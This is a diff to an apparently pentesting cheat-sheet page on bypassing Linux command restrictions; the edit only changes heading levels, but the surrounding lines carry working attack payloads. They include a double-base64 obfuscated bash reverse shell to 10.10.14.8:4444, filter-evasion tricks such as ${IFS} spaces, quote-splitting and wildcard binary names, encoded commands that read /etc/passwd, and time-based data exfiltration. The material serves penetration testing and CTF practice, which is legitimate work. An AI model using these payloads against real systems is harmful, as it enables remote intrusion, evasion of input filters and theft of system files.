@@ -1,13 +1,13 @@
 # Bypass-Linux-Restrictions
 ## Common Limitations Bypasses
 
-# Reverse Shell
+## Reverse Shell
 ```
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-# Short Rev shell
+## Short Rev shell
 ```
 #Trick from Dikline
 #Get a rev shell with
@@ -16,7 +16,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 exec >&0
 
 ```
-# Bypass Paths and forbidden words
+## Bypass Paths and forbidden words
 ```
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -77,7 +77,7 @@ whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
 
-# Bypass forbidden spaces
+## Bypass forbidden spaces
 
 ```
 # {form}
@@ -105,19 +105,19 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-# Bypass backslash and slash
+## Bypass backslash and slash
 
 ```
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
 
-# Bypass pipes
+## Bypass pipes
 ```
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 
-# Bypass with hex encoding
+## Bypass with hex encoding
 
 ```
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
@@ -129,20 +129,20 @@ xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
 
-# Bypass IPs
+## Bypass IPs
 
 ```
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
 
-# Time based data exfiltration
+## Time based data exfiltration
 
 ```
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
 
-# Getting chars from Env Variables
+## Getting chars from Env Variables
 
 ```
 echo ${LS_COLORS:10:1} #;
